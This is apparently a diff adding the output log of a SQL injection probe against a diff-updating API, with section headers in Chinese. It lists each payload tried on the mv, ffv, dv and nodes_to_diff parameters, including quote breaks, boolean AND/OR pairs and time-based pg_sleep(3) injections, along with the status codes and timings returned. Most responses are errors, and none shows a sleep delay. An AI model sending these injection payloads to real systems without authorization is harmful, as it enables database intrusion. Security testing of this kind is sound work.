@@ -1,0 +1,63 @@
+===== A: 基线采样 =====
+[A_base1] 500  1561ms :: {"error":true,"message":"Error updating diff."} (基线)
+[A_base2] 500   965ms :: {"error":true,"message":"Error updating diff."} (基线)
+[A_base3] 500  1942ms :: {"error":true,"message":"Error updating diff."} (基线)
+===== B: mv 注入 =====
+[B1_q] 500   621ms :: {"error":true,"message":"Error updating diff."} (mv=0')
+[B2_qcm] 500   922ms :: {"error":true,"message":"Error updating diff."} (mv=0'--)
+[B3_a11] 500  1101ms :: {"error":true,"message":"Error updating diff."} (mv=0 AND 1=1)
+[B4_a12] 500   707ms :: {"error":true,"message":"Error updating diff."} (mv=0 AND 1=2)
+[B5_sleep] 500   952ms :: {"error":true,"message":"Error updating diff."} (mv=0;SELECT pg_sleep(3)--)
+[B6_concat] 500  1146ms :: {"error":true,"message":"Error updating diff."} (mv=0'||pg_sleep(3)||')
+[B7_q11] 500   713ms :: {"error":true,"message":"Error updating diff."} (mv=0' AND '1'='1)
+[B8_q12] 500   918ms :: {"error":true,"message":"Error updating diff."} (mv=0' AND '1'='2)
+===== C: ffv 注入 =====
+[C1_q] 500   992ms :: {"error":true,"message":"Error updating diff."} (ffv=..2383785353797520871')
+[C2_qcm] 500  1146ms :: {"error":true,"message":"Error updating diff."} (ffv=..2383785353797520871'--)
+[C3_q11] 500   614ms :: {"error":true,"message":"Error updating diff."} (ffv=..3785353797520871' AND '1'='1)
+[C4_q12] 500   579ms :: {"error":true,"message":"Error updating diff."} (ffv=..3785353797520871' AND '1'='2)
+[C5_or11] 404   875ms :: {"error":true,"message":"Not found."} (ffv=..0 OR 1=1)
+[C6_or12] 404   359ms :: {"error":true,"message":"Not found."} (ffv=..0 OR 1=2)
+[C7_sleep] 500  1257ms :: {"error":true,"message":"Error updating diff."} (ffv=..7520871;SELECT pg_sleep(3)--)
+[C8_concat] 500  1126ms :: {"error":true,"message":"Error updating diff."} (ffv=..53797520871'||pg_sleep(3)||')
+===== D: 重复参数 =====
+[D1_dup] 500  1133ms :: {"error":true,"message":"Error updating diff."} (ffv x2)
+[D2_dupq] 500  1116ms :: {"error":true,"message":"Error updating diff."} (ffv 有效+注入)
+[D3_arr] 500  1170ms :: {"error":true,"message":"Error updating diff."} (ffv 单元素数组)
+===== E: dv 对照 =====
+[E1_q] 400   711ms :: {"error":true,"message":"'diff_version' must be a valid number, received type String"} (dv=1')
+[E2_or] 400   812ms :: {"error":true,"message":"'diff_version' must be a valid number, received type String"} (dv=2 AND 1=1)
+===== F: nodes_to_diff =====
+[F1_plain] 500   938ms :: {"error":true,"message":"Error updating diff."} (nodes=0:1)
+[F2_q] 500  1166ms :: {"error":true,"message":"Error updating diff."} (nodes=0:1')
+[F3_a11] 500   936ms :: {"error":true,"message":"Error updating diff."} (nodes=..1' AND '1'='1)
+
+===== SUMMARY =====
+A_base1      500  1561ms '{"error":true,"message":"Error updating diff."}'
+A_base2      500   965ms '{"error":true,"message":"Error updating diff."}'
+A_base3      500  1942ms '{"error":true,"message":"Error updating diff."}'
+B1_q         500   621ms '{"error":true,"message":"Error updating diff."}'
+B2_qcm       500   922ms '{"error":true,"message":"Error updating diff."}'
+B3_a11       500  1101ms '{"error":true,"message":"Error updating diff."}'
+B4_a12       500   707ms '{"error":true,"message":"Error updating diff."}'
+B5_sleep     500   952ms '{"error":true,"message":"Error updating diff."}'
+B6_concat    500  1146ms '{"error":true,"message":"Error updating diff."}'
+B7_q11       500   713ms '{"error":true,"message":"Error updating diff."}'
+B8_q12       500   918ms '{"error":true,"message":"Error updating diff."}'
+C1_q         500   992ms '{"error":true,"message":"Error updating diff."}'
+C2_qcm       500  1146ms '{"error":true,"message":"Error updating diff."}'
+C3_q11       500   614ms '{"error":true,"message":"Error updating diff."}'
+C4_q12       500   579ms '{"error":true,"message":"Error updating diff."}'
+C5_or11      404   875ms '{"error":true,"message":"Not found."}'
+C6_or12      404   359ms '{"error":true,"message":"Not found."}'
+C7_sleep     500  1257ms '{"error":true,"message":"Error updating diff."}'
+C8_concat    500  1126ms '{"error":true,"message":"Error updating diff."}'
+D1_dup       500  1133ms '{"error":true,"message":"Error updating diff."}'
+D2_dupq      500  1116ms '{"error":true,"message":"Error updating diff."}'
+D3_arr       500  1170ms '{"error":true,"message":"Error updating diff."}'
+E1_q         400   711ms '{"error":true,"message":"\'diff_version\' must be a valid number, received type String"}'
+E2_or        400   812ms '{"error":true,"message":"\'diff_version\' must be a valid number, received type String"}'
+F1_plain     500   938ms '{"error":true,"message":"Error updating diff."}'
+F2_q         500  1166ms '{"error":true,"message":"Error updating diff."}'
+F3_a11       500   936ms '{"error":true,"message":"Error updating diff."}'
+DONE205
